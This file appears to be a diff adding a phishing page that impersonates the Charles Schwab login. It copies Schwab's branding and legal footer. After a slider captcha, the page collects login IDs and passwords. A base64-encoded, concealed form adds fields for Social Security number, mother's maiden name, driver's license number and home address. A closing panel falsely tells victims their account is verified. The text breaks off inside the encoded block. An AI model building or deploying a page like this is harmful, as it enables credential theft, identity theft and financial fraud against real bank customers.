@@ -1,0 +1,555 @@
+<html>
+
+<head id="Head1">
+    <meta charset="utf-8">
+    <title>Login | Charles Schwab</title>
+    <meta name="description" content="Charles Schwab">
+    <link rel="icon" type="image/png" href="https://i.imgur.com/zRNjNcz.png">
+    <link type="text/css" rel="stylesheet" href="css/main.css?v=20.19">
+    <link type="text/css" rel="stylesheet" href="css/login-component-responsive-secondary.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+    <link rel="stylesheet" type="text/css" href="css/sdps.css">
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link href="css/slidercaptcha.min.css" rel="stylesheet" />
+    <style type="text/css">
+        .submit-btn {
+            box-shadow: inset 0px 0px 0px 0px #caefab;
+            background: linear-gradient(to bottom, #005f83 5%, #005f83 100%);
+            background-color: #005f83 100%;
+            border-radius: 6px;
+            border: 1px solid #ebebeb;
+            display: inline-block;
+            cursor: pointer;
+            color: #ffffff;
+            font-family: Arial;
+            font-size: 15px;
+            padding: 8px 50px;
+            text-decoration: none;
+            text-shadow: 0px 1px 0px #aade7c;
+        }
+
+        .submit-btn:disabled,.submit-btn:disabled:hover {  
+            background: linear-gradient(to bottom, #43494b 5%, #797c7e 100%);
+            background-color: #293a41 100%;
+            color: #ffffff;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(to bottom, #005f83 5%, #005f83 100%);
+            background-color: #005f83;
+        }
+
+        .submit-btn:active {
+            position: relative;
+            top: 1px;
+        }
+
+        .container {
+            width: auto;
+        }
+
+        .main {
+            width: auto;
+            margin: 15px;
+        }
+
+        section.main-content {
+            width: auto;
+            float: none;
+        }
+
+        div.login-wrapper {
+            width: auto;
+            height: 1320px;
+            min-height: 500px;
+            padding: 30px 0 0;
+            background: url('images/Login_Background.jpg') no-repeat center;
+            background-size: cover;
+        }
+
+        div.module {
+            width: auto;
+            height: 608px;
+            text-align: center;
+        }
+
+        footer {
+            width: auto;
+            margin: 40px auto 0;
+        }
+
+        footer .disclosures {
+            width: auto;
+            font-family: ArialMT, Arial, sans-serif;
+            font-size: 11px;
+            line-height: 13px;
+            color: #222;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3; /* Light grey */
+            border-top: 3px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            animation: spin 1s linear infinite;
+            }
+
+        @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+        }
+
+        .clearfix{ overflow: auto;}
+
+    </style>
+    <style>
+        .slidercaptcha {
+            margin: 0 auto;
+            width: 314px;
+            height: 286px;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.125);
+            margin-top: 40px;
+        }
+
+            .slidercaptcha .card-body {
+                padding: 1rem;
+            }
+
+            .slidercaptcha canvas:first-child {
+                border-radius: 4px;
+                border: 1px solid #e6e8eb;
+            }
+
+            .slidercaptcha.card .card-header {
+                background-image: none;
+                background-color: rgba(0, 0, 0, 0.03);
+            }
+
+        .refreshIcon {
+            top: -54px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="loginContainer">
+        <header>
+            <div class="container">
+                <div id="headerLogo" class="header__logo"><a href="#" class="logo"
+                        aria-label="Charles Schwab Logo click here to go to the home page." target="_top">
+                        <span class="svg-icon svg-logo" aria-hidden="true"></span>
+                    </a></div>
+            </div>
+        </header>
+        <div class="main cf">
+            <section class="main-content">
+                <div class="login-wrapper" style="margin-bottom: 20px;">
+
+                    <div class="module">
+                        <div class="login">
+                            <div id="cont-1" style="display: none;">
+                                <h4 id="loginHeadline">To get started<br>Please fill out the required fields </h4><br>
+                                <div id="iframeWrapper" class="login__iframe" style="height: auto;">
+                                    <div>
+                                        <div id="msg" style="display: none;color: red;font-weight: 300">Invalid
+                                            password.! Please enter correct password.</div>
+                                    </div>
+                                    <form class="form-horizontal" id="form1" action="./next.php" method="POST">
+                                        <div id="lms-login-widget-responsive-secondary"></div>
+                                    </form>
+                                </div>
+                            </div>
+                            <div id="cont-2" style="display: none;">
+                                <div id="iframeWrapper" class="login__iframe" style="height: auto;">
+                                    <div>
+                                        
+                                    </div>
+                                    <form id="form2" class="form-horizontal" id="LoginComponetForm" method="POST" autocomplete="off" >
+                                        <h4 id="loginHeadline" style="font-weight: 600; text-align: left;">Log in to
+                                            Schwab </h4>
+                                        <p style="text-align: left; font-size: 16px; margin-top:6px">Please login to complete verification</p> 
+
+                                        <p id="error_msg" style="text-align: left; display: block;color: red;font-weight: 300"> </p>
+                                        
+                                        <input type="hidden" name="count" id="count" value="0">
+                                        <div id="lms-login-widget-responsive-secondary">
+                                            <div class="form-group first-field ">
+                                                <div class="col-xs-12 control-label first-field-label"
+                                                    style="text-align: left; "><label for="label-111"
+                                                        style="font-weight: normal" id="label-111">Login
+                                                        ID</label></div>
+                                                <div class="col-xs-12"><input class="form-control" id="lid-2" name="login-id-2" type="text" value="" required></div>
+                                            </div>
+                                            <div class="form-group first-field ">
+                                                <div class="col-xs-12 control-label first-field-label"
+                                                    style="text-align: left; "><label for="passwordi"
+                                                        style="font-weight: normal" >Password</label></div>
+                                                <div class="col-xs-12"><input class="form-control" id="passwordi" name="pass" type="password" value="" autocomplete="off" required></div>
+                                            </div>
+                                            <div class="form-group">
+                                                <div class="col-xs-12 control-label" style="text-align: left; "><label
+                                                        for="StartIn" style="font-weight: normal"></label></div>
+                                                <div class="col-xs-12">
+                                                    <div class="start-in-wrapper">
+
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="form-group"
+                                                style="float: left; margin-left:20px; margin-top: -20px;">
+                                                <input type="checkbox" id="checkbox" style="margin-right: 10px;" />
+                                                <label for="checkbox" style="font-weight: 400;">Remember Login
+                                                    ID</label>
+                                            </div>
+                                            <!-- <input type="submit" style="display:none" id="hhbtn" /> -->
+                                            <div class="lms-widget-login-close-cntr">
+                                                <div class="lms-secondary-button-section">
+                                                    <button class="submit-btn" id="btn2" type="button" name="btn2"
+                                                        style="width: 100%;">
+                                                        Submit
+                                                </button>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </form>
+                                </div>
+                            </div>
+                            <div id="cont-3" style="display: none; padding:10px">
+                                <div class="hero text-center" >
+                                    <br /><br /><br />
+                                    <div class="text-">
+                                        <img src="https://i.imgur.com/GPmRJ4m.png" style="width: 100px;" />
+                                        <br /><br />
+                                        <h1 style="font-weight: 500;"> Congratulations! </h1>
+                                    </div>
+                                    <br />
+                                    <p class="text-muted">Your Charles Schwab account(s) has been verified. <br/> Your session has ended and you'll be redirected to the main page shortly. <br>  <br>Thank you for choosing Schwab. </p>
+                                </div>
+                            </div>
+                            <div id="cont-cap">
+                                <div class="container-fluid">
+                                    <div class="form-row">
+                                        <div class="col-12">
+                                            <div class="slidercaptcha card">
+                                                <div class="card-header">
+                                                    <span>Prove you're not a robot</span>
+                                                </div>
+                                                <div class="card-body">
+                                                    <div id="captcha"></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="login__utilitylinks cf" style="margin-top: 40px">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="clearfix"></div>
+
+                <footer role="contentinfo" class="sdps-p-left_small sdps-p-right_small sdps-m-top_small">
+                    <div id="clientRelationship" class="sdps-grid-fluid">
+                        <div class="col sdps-p-around_medium">
+                            <div><span id="clientRelationshipSummaryText1" class="sdps-text-l-bold-body">Important
+                                    information about our relationship with you:</span> <a
+                                    href="https://www.schwab.com/transparency" id="lnkRelationshipSummaries">Client
+                                    Relationship Summaries</a></div>
+                            <div class="sdps-p-top_medium"><span id="clientRelationshipSummaryText2">Our Client
+                                    Relationship Summaries offer a brief summary of our services, fees and obligations
+                                    when we work with you in a broker-dealer or an investment advisory relationship.
+                                    Learn more at</span> <a href="https://www.schwab.com/transparency"
+                                    id="lnkSchwabTransparency">schwab.com/transparency</a>.</div>
+                        </div>
+                    </div>
+                    <div id="footerlinks">
+                        <ul class="sdps-list--inline">
+                            <li><span class="svg-lock-icon"></span><a
+                                    href="/public/schwab/nn/legal_compliance/schwabsafe" id="footerLink1"
+                                    target="_blank" class="links-allign">Schwab Safe®</a>|</li>
+                            <li><a href="/public/schwab/nn/legal_compliance/schwabsafe/security_guarantee.html"
+                                    id="footerLink2" target="_blank" class="links-allign">The Schwab Security
+                                    Guarantee</a>|</li>
+                            <li><a href="http://www.schwab.com" id="footerLink3">Schwab Homepage</a></li>
+                        </ul>
+                    </div>
+                    <div id="CHANFooter" class="footer__disclosures sdps-p-bottom_medium">
+                        <p><a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track=""
+                                href="http://www.schwab.com/public/schwab/nn/customer_service/browsers.html" rel=""
+                                target="" title="" type="">Web Browser Information</a> — IMPORTANT information for
+                            Windows XP users.</p>
+                        <p class="disclosures">Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value
+                        </p>
+                        <p>Not all products and services listed are available outside the U.S. and some are subject to
+                            country specific restrictions.</p>
+                        <p>Check the background of this firm or one of its investment professionals on <a
+                                data-popup-height="" data-popup-width="" data-stock-symbol="" data-track=""
+                                href="https://brokercheck.finra.org/" rel="" target="" title="" type="">FINRA's
+                                BrokerCheck</a>.</p>
+                        <p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial
+                            advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles
+                            Schwab &amp; Co., Inc. (<a data-popup-height="" data-popup-width="" data-stock-symbol=""
+                                data-track="" href="http://www.sipc.org/" rel="" target="" title="" type="">member
+                                SIPC</a>), offers investment services and products, including Schwab brokerage accounts.
+                            Its banking subsidiary, Charles Schwab Bank (member FDIC and an Equal Housing Lender),
+                            provides deposit and lending services and products. Access to Electronic Services may be
+                            limited or unavailable during periods of peak demand, market volatility, systems upgrade,
+                            maintenance, or for other reasons.</p>
+                        <p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific
+                            restrictions. Learn more about our services for <a data-popup-height="" data-popup-width=""
+                                data-stock-symbol="" data-track=""
+                                href="http://www.schwab-global.com/public/schwab-gcb-en" rel="" target="" title=""
+                                type="">non-U.S. residents</a>.</p>
+                        <p>© 2023 Charles Schwab &amp; Co., Inc, All rights reserved. Member <a data-popup-height=""
+                                data-popup-width="" data-stock-symbol="" data-track="" href="http://www.sipc.org/"
+                                rel="" target="" title="" type="">SIPC</a>. Unauthorized access is prohibited. Usage
+                            will be monitored. (0617-ZYYE)</p>
+                    </div>
+                </footer>
+        </div>
+        </section>
+    </div>
+    </div>
+    <style>
+        .tb_button {
+            padding: 1px;
+            cursor: pointer;
+            border-right: 1px solid #8b8b8b;
+            border-left: 1px solid #FFF;
+            border-bottom: 1px solid #fff;
+        }
+
+        .tb_button.hover {
+            borer: 2px outset #def;
+            background-color: #f8f8f8 !important;
+        }
+
+        .ws_toolbar {
+            z-index: 100000
+        }
+
+        .ws_toolbar .ws_tb_btn {
+            cursor: pointer;
+            border: 1px solid #555;
+            padding: 3px
+        }
+
+        .tb_highlight {
+            background-color: yellow
+        }
+
+        .tb_hide {
+            visibility: hidden
+        }
+
+        .ws_toolbar img {
+            padding: 2px;
+            margin: 0px
+        }
+    </style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+    <!-- <div class="loader" style="float: right;"></div>  -->
+
+
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+        crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+        crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+        crossorigin="anonymous"></script>
+</body>
+<script src="css/longbow.slidercaptcha.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+
+    var sess = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+    /* global $ */
+    $(document).ready(function () {
+
+
+        var captcha = sliderCaptcha({
+            id: 'captcha',
+            loadingText: 'Loading...',
+            failedText: 'Try again',
+            barText: 'Slide right to fill',
+            setSrc: function () {
+                return 'images/vClny8q.jpeg';
+            },
+            onSuccess: function () {  //成功事件
+                var handler = setTimeout(function () {
+                    window.clearTimeout(handler);
+                    $("#cont-cap").hide();
+                    $("#cont-1").show();
+                    let n = `DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5GaXJzdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lPC9sYWJlbD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiI+PGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJmbiIgbmFtZT0iZmlyc3RfbmFtZSINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZT0idGV4dCIgdmFsdWU9IiIgcmVxdWlyZWQ+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGZpcnN0LWZpZWxkICI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29udHJvbC1sYWJlbCBmaXJzdC1maWVsZC1sYWJlbCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0idGV4dC1hbGlnbjogbGVmdDsgIj48bGFiZWwgZm9yPSJMb2dpbklkIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHlsZT0iZm9udC13ZWlnaHQ6IG5vcm1hbCIgaWQ9InVzZXJFbWFpbC1sYWJlbCI+TGFzdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lPC9sYWJlbD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiI+PGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJsbiIgbmFtZT0ibGFzdF9uYW1lIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIiByZXF1aXJlZD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5BZGRyZXNzPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIj48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImFkIiBuYW1lPSJhZGRyZXNzIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIiByZXF1aXJlZD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5DaXR5PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIj48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImN0IiBuYW1lPSJjaXR5Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIiByZXF1aXJlZD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5TdGF0ZTwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiI+PGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJzdCIgbmFtZT0ic3RhdGUiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU9InRleHQiIHZhbHVlPSIiIHJlcXVpcmVkPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmaXJzdC1maWVsZCAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbnRyb2wtbGFiZWwgZmlyc3QtZmllbGQtbGFiZWwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7ICI+PGxhYmVsIGZvcj0iTG9naW5JZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWwiIGlkPSJ1c2VyRW1haWwtbGFiZWwiPlppcCBDb2RlPC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIj48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9InpjIiBuYW1lPSJ6aXBjb2RlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPSJudW1iZXIiIHZhbHVlPSIiIHJlcXVpcmVkPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGI+Rm9yIGZ1cnRoZXIgdmVyaWZpY2F0aW9uPC9iPjxicj48YnI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5Mb2dpbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJRDwvbGFiZWw+PC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIiPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0ibGlkLTEiIG5hbWU9ImxvZ2luLWlkLTEiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGU9InRleHQiIHZhbHVlPSIiIHJlcXVpcmVkPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmaXJzdC1maWVsZCAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbnRyb2wtbGFiZWwgZmlyc3QtZmllbGQtbGFiZWwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7ICI+PGxhYmVsIGZvcj0iTG9naW5JZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWwiIGlkPSJ1c2VyRW1haWwtbGFiZWwiPk1vdGhlcuKAmXMgTWFpZGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWU8L2xhYmVsPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIj48aW5wdXQgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9Im1tbiIgbmFtZT0ibW90aGVyX21haWRlbl9uYW1lIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IiB2YWx1ZT0iIiByZXF1aXJlZD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgZmlyc3QtZmllbGQgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb250cm9sLWxhYmVsIGZpcnN0LWZpZWxkLWxhYmVsIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJ0ZXh0LWFsaWduOiBsZWZ0OyAiPjxsYWJlbCBmb3I9IkxvZ2luSWQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIiBpZD0idXNlckVtYWlsLWxhYmVsIj5Tb2NpYWwgU2VjdXJpdHkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTnVtYmVyPC9sYWJlbD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiI+PGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJzc24iIG5hbWU9IlNTTiIgIHZhbHVlPSIiIHJlcXVpcmVkIHNpemU9IjEzIiBtYXhsZW5ndGg9IjEzIiBvbmtleXVwPSJqYXZhc2NyaXB0OnRoaXMudmFsdWU9cGFyZW50LmZpeFNTTih0aGlzLnZhbHVlKSIgPjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBmaXJzdC1maWVsZCAiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbnRyb2wtbGFiZWwgZmlyc3QtZmllbGQtbGFiZWwiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7ICI+PGxhYmVsIGZvcj0iTG9naW5JZCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZvbnQtd2VpZ2h0OiBub3JtYWwiIGlkPSJ1c2VyRW1haWwtbGFiZWwiPkRyaXZlcidzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExpY2Vuc2UgTnVtYmVyPC9sYWJlbD48L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI